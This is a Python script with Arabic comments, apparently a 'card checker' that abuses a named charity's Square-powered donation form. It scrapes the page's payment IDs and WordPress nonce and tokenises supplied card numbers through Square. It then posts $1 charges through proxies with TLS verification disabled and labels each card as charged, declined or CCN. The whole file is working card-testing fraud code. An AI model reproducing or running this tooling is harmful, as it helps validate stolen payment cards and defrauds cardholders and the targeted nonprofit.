"""
بوابة الدفع: Square Charge $1 (Single)
الموقع: chrysaliscenterct.org
نوع البوابة: Square Charge $1
تدفق الطلبات:
1. GET /donate/ -> استخراج Square applicationId + locationId + nonce
2. GET https://pci-connect.squareup.com/payments/hydrate -> sessionId + instanceId
3. POST https://pci-connect.squareup.com/v2/card-nonce -> card_nonce
4. POST /wp-admin/admin-ajax.php (Square charge action) -> النتيجة
"""
import aiohttp
import asyncio
import uuid
import ssl
import re


async def req1_get_square_ids(
    session: aiohttp.ClientSession,
    proxy_url: str = None,
) -> tuple[str, str, str]:
    """الخطوة 1: جلب معرفات Square من صفحة التبرع."""
    try:
        async with session.get(
            "https://chrysaliscenterct.org/donate/",
            proxy=proxy_url,
        ) as r:
            text = await r.text()
        app_id_match = re.search(r'applicationId["\']:\s*["\']([^"\']+)["\']', text)
        loc_id_match = re.search(r'locationId["\']:\s*["\']([^"\']+)["\']', text)
        nonce_match = re.search(r'["\']nonce["\']:\s*["\']([^"\']+)["\']', text)
        app_id = app_id_match.group(1) if app_id_match else ""
        loc_id = loc_id_match.group(1) if loc_id_match else ""
        wp_nonce = nonce_match.group(1) if nonce_match else ""
        if not app_id or not loc_id:
            raise RuntimeError("Square IDs not found in page")
        return app_id, loc_id, wp_nonce
    except Exception as e:
        raise RuntimeError(f"req1_get_square_ids failed: {e}") from e


async def req2_hydrate(
    session: aiohttp.ClientSession,
    app_id: str,
    loc_id: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الخطوة 2: جلب sessionId و instanceId من Square Hydrate."""
    url = f"https://pci-connect.squareup.com/payments/hydrate?applicationId={app_id}&locationId={loc_id}"
    try:
        async with session.get(url, proxy=proxy_url) as r:
            data = await r.json(content_type=None)
            return data.get("sessionId", ""), data.get("instanceId", "")
    except Exception as e:
        raise RuntimeError(f"req2_hydrate failed: {e}") from e


async def req3_get_card_nonce(
    session: aiohttp.ClientSession,
    app_id: str,
    session_id: str,
    instance_id: str,
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 3: تحويل بيانات البطاقة إلى card_nonce عبر Square API."""
    url = "https://pci-connect.squareup.com/v2/card-nonce"
    payload = {
        "application_id": app_id,
        "card_data": {
            "number": cc,
            "cvv": cvv,
            "exp_month": int(mes),
            "exp_year": int(ano),
            "billing_postal_code": "10001",
        },
        "session_id": session_id,
        "instance_id": instance_id,
    }
    try:
        async with session.post(url, json=payload, proxy=proxy_url) as r:
            data = await r.json(content_type=None)
            nonce = data.get("card_nonce", "")
            if not nonce:
                raise RuntimeError(f"Card Nonce Failed: {data.get('errors', 'Unknown Error')}")
            return nonce
    except Exception as e:
        raise RuntimeError(f"req3_get_card_nonce failed: {e}") from e


async def req4_charge(
    session: aiohttp.ClientSession,
    wp_nonce: str,
    card_nonce: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 4: إرسال طلب الشحن النهائي للموقع."""
    url = "https://chrysaliscenterct.org/wp-admin/admin-ajax.php"
    payload = {
        "action": "square_charge_action",
        "nonce": wp_nonce,
        "card_nonce": card_nonce,
        "amount": "1.00",
        "currency": "USD",
    }
    try:
        async with session.post(url, data=payload, proxy=proxy_url) as r:
            return await r.text()
    except Exception as e:
        raise RuntimeError(f"req4_charge failed: {e}") from e


async def process_SQ_single_charge(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Square Charge $1 (Single)."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)
    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            app_id, loc_id, wp_nonce = await req1_get_square_ids(session, proxy_url)
            session_id, instance_id = await req2_hydrate(session, app_id, loc_id, proxy_url)
            card_nonce = await req3_get_card_nonce(
                session, app_id, session_id, instance_id, cc, mes, ano, cvv, proxy_url
            )
            response_text = await req4_charge(session, wp_nonce, card_nonce, proxy_url)
    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"
    rt_lower = response_text.lower()
    if any(x in rt_lower for x in ["success", "thank you", "approved", "captured"]):
        return f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝 ✅ | {cc}|{mes}|{ano}|{cvv}", response_text
    elif any(x in rt_lower for x in ["insufficient funds", "card_declined", "transaction_declined", "do_not_honor"]):
        return f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ | {cc}|{mes}|{ano}|{cvv}", response_text
    elif any(x in rt_lower for x in ["cvv", "incorrect_cvc", "cvc_check_failed"]):
        return f"𝐂𝐂𝐍 ♻️ | {cc}|{mes}|{ano}|{cvv}", response_text
    else:
        return f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ | {cc}|{mes}|{ano}|{cvv}", response_text
